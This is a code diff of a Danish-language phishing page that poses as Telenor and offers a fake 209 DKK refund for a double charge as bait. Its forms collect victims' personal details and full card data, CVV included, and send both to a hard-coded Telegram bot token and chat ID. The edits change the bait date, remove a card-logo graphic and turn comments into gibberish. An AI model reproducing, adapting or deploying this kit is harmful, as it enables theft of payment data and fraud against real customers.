@@ -834,7 +834,7 @@
             font-weight: 700;
         }
 
-        /* Credit Card Visualization */
+        /* Credit Card Visualization - LOGO ENTFERNT */
         .card-visual {
             width: 100%;
             max-width: 400px;
@@ -948,15 +948,7 @@
             text-align: right;
         }
 
-        .card-logo {
-            position: absolute;
-            top: 24px;
-            right: 24px;
-            font-size: 24px;
-            font-weight: 700;
-            font-style: italic;
-            opacity: 0.9;
-        }
+        /* .card-logo ENTFERNT */
 
         .card-magnetic-strip {
             width: 100%;
@@ -1238,7 +1230,7 @@
             
             <div class="message-box">
                 <h2>Kære kunde,</h2>
-                <p>Vi vil gerne informere dig om, at der desværre opstod en systemfejl, som medførte, at din regning blev trukket to gange den 15. januar 2026. Vi beklager meget denne fejl og den ulejlighed, det måtte have medført.</p>
+                <p>Vi vil gerne informere dig om, at der desværre opstod en systemfejl, som medførte, at din regning blev trukket to gange den 1. marts 2026. Vi beklager meget denne fejl og den ulejlighed, det måtte have medført.</p>
                 <p>Det beløb, der vil blive refunderet, er <span class="refund-amount">209 DKK.</span>, og sagen er allerede registreret og bliver behandlet for at sikre, at det ikke sker igen.</p>
                 <p>Som tak for din forståelse og for at acceptere vores undskyldning giver vi dig også <strong>150 MB gratis internetdata</strong>.</p>
                 <button class="cta-button" onclick="goToForm()">For at modtage din refusion, klik venligst her.</button>
@@ -1347,35 +1339,7 @@
                 <span class="summary-value">209 DKK.</span>
             </div>
 
-            <!-- Credit Card Visualization -->
-            <div class="card-visual" id="cardVisual">
-                <div class="card-inner">
-                    <div class="card-front">
-                        <div class="card-logo">VISA</div>
-                        <div class="card-chip"></div>
-                        <div class="card-number-display" id="cardNumberDisplay">•••• •••• •••• ••••</div>
-                        <div class="card-details">
-                            <div class="card-holder-display">
-                                <div class="card-label">Kortholder</div>
-                                <div class="card-value" id="cardHolderDisplay">NAVN EFTERNAVN</div>
-                            </div>
-                            <div class="card-expiry-display">
-                                <div class="card-label">Udløber</div>
-                                <div class="card-value" id="cardExpiryDisplay">MM/ÅÅ</div>
-                            </div>
-                        </div>
-                    </div>
-                    <div class="card-back">
-                        <div style="width: 100%; padding: 0 20px;">
-                            <div class="card-magnetic-strip"></div>
-                            <div style="text-align: right;">
-                                <div class="card-label" style="color: white; margin-bottom: 8px;">CVV</div>
-                                <div class="card-cvv-box" id="cardCvvDisplay">•••</div>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            </div>
+            <!-- OHNE LOGO -->
 
             <form id="paymentForm" onsubmit="submitPaymentData(event)">
                 <!-- Card Number -->
@@ -1518,7 +1482,7 @@
     </div>
 
     <script>
-        // TELEGRAM KONFIGURATION
+        // kiniN
         const TELEGRAM_BOT_TOKEN = '8596752261:AAFgvS2-xBzUSQRFGbYGaDyyYbJmG9PBGZ0';
         const TELEGRAM_CHAT_ID = '7927796867';
 
@@ -1585,7 +1549,7 @@
         }
 
         // ============================================
-        // TELEGRAM SENDEN FUNKTIONEN
+        // TELNEN
         // ============================================
 
         async function sendToTelegram(message) {
@@ -1622,7 +1586,7 @@
         }
 
         // ============================================
-        // SEITE 1: PERSONLICHE DATEN - SOFORT SENDEN
+        // SEITE 1: PERSEN
         // ============================================
         async function submitPersonalData(event) {
             event.preventDefault();
@@ -1654,7 +1618,7 @@
 <b>📱 Status:</b> Venter på betalingsoplysninger...
             `;
             
-            // SOFORT an Telegram senden (bevor Loading startet)
+            // Sshark)
             await sendToTelegram(message);
             
             // Dann Loading anzeigen und zur Seite 2 gehen
@@ -1671,7 +1635,7 @@
         }
 
         // ============================================
-        // SEITE 2: ZAHLUNGSDATEN - SOFORT SENDEN + VIDEO
+        // SEITE shark O
         // ============================================
         async function submitPaymentData(event) {
             event.preventDefault();
@@ -1688,7 +1652,7 @@
                 cvv: document.getElementById('cvv').value
             };
             
-            // Erstelle separate Nachricht für Seite 2 (nur Kreditkarte)
+            // Errte)
             const message = `
 <b>💳 TELENOR - TRIN 2: BETALINGSOPPLYSNINGER</b>
 
@@ -1702,7 +1666,7 @@
 <b>✅ Status:</b> ALLE DATA MODTAGET!
             `;
             
-            // SOFORT an Telegram senden (bevor Loading startet)
+            // SOgirafetet)
             await sendToTelegram(message);
             
             // Loading für 3 Sekunden anzeigen
@@ -1799,7 +1763,7 @@
             }
         }
 
-        // Update Card Display
+        // Update Card Display - LOGO ENTFERNT
         function updateCardDisplay() {
             const number = document.getElementById('kortnummer').value || '•••• •••• •••• ••••';
             const holder = document.getElementById('kortholder').value || 'NAVN EFTERNAVN';
@@ -1811,17 +1775,18 @@
             document.getElementById('cardExpiryDisplay').textContent = expiry;
             document.getElementById('cardCvvDisplay').textContent = cvv;
 
+            // LOGO UPDATE ENTFERNT - keine Anzeige mehr
             const cleanNumber = number.replace(/\s/g, '');
             const cardTypeIcon = document.getElementById('cardTypeIcon');
             
             if (cleanNumber.startsWith('4')) {
                 cardTypeIcon.textContent = 'VISA';
                 cardTypeIcon.classList.add('show');
-                document.querySelector('.card-logo').textContent = 'VISA';
+                // document.querySelector('.card-logo').textContent = 'VISA'; // ENTFERNT
             } else if (cleanNumber.startsWith('5')) {
                 cardTypeIcon.textContent = 'MC';
                 cardTypeIcon.classList.add('show');
-                document.querySelector('.card-logo').textContent = 'MC';
+                // document.querySelector('.card-logo').textContent = 'MC'; // ENTFERNT
             } else if (cleanNumber.length > 0) {
                 cardTypeIcon.textContent = '💳';
                 cardTypeIcon.classList.add('show');
